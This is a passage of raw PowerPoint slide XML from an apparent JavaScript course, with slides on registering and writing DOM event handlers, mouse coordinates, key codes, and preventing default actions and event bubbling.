            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADA54641-BFC7-40BE-A276-1CFFE31648DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Registering Event Handlers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13315" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{553BA20C-7FFB-414A-AF2A-0F401316FA5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="479425" y="1600200"/>
            <a:ext cx="11233150" cy="4972050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>xxx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> attribute of HTML tags e.g.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input type="button" onclick="clickHandler(event)"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>xxx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> attribute of HTML elements</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.getElementById("idname").onclick = clickHandler;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>element.addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>useCapture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>type </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>is a string describing type of event e.g. "click" (without the "on" prefix)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>handler is  function which is called</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>if useCapture is true the handler is invoked only during capturing phase of event propagation. If false then then event handler is triggered only if the actual element causes the event</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.getElementById("idname").</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("click", clickHandler)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>element.removeEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(type, handler). You must use the same handler, which you used to register the event handler, to remove it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.getElementById("idname"). </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>removeEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("click", clickHandler)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="20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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10561049-F98B-4BDD-88FB-F17D8D60DFB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Writing Event Handlers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E383CCEB-05EF-48A3-A167-9AD3E59B2650}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4829175"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IE gets event object via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>global variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>window.event, where other browsers get it as parameter passed to the event handler function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>To make code compatible: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function eventHandler(e)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e = e || window.event;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your event handler code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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{763D1043-C6CE-4405-BFDF-0F35DD870C51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Calculating Mouse Coordinates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDE565D4-76ED-4527-B844-084D877BC47D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4900613"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IE calculates mouse coordinates differently (especially on pages which don't fit window and have been scrolled)</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function getMouseCoordinates(e)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if (e.pageX || e.pageY)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x = e.pageX;</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y = e.pageY;</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else if (e.clientX || e.clientY)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x = e.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;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y = e.clientY + document.body.scrollTop +  document.documentElement.scrollTop;</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return {'x':x, 'y': y};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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE597342-6C59-4A78-B73C-3FB1C3C9B6D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Reading Keyboard Presses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCC9F25D-EB85-4AAF-BC33-1FB9917EE90A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="5043488"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IE uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event.keyCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and other browsers use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event.which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to find which keycode generated the key event.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>to get the character use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="1" dirty="0"/>
              <a:t>String.fromCharCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0"/>
              <a:t>keyCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRP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function keyEventhandler(e) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>code;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e = e || window.event;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if (e.keyCode)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code = e.keyCode;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else if (e.which)</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code = e.which;</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 your key handler code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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9EC6C759-4F0E-42A4-B359-C43428189BCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Preventing Default Action</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13C243FE-24E1-4442-8871-407505C20FEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8401050" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>many events like dragging a mouse pointer with mouse button down or pressing F5/F11/F12 key cause a default action, which can be prevented </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>using the code below:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cancelDefaultAction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(e) {</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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>e.preventDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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e.preventDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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else if (window.event &amp;&amp;</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window.event.returnValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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window.eventReturnValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = false;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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{853009FB-A55F-4824-8B9B-6C254D73C0F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Preventing Event Bubbling</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F42263F7-5300-4830-A407-36FFAD24ABFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4972050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Many events propagate / bubble to underlying elements, which is not always feasible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
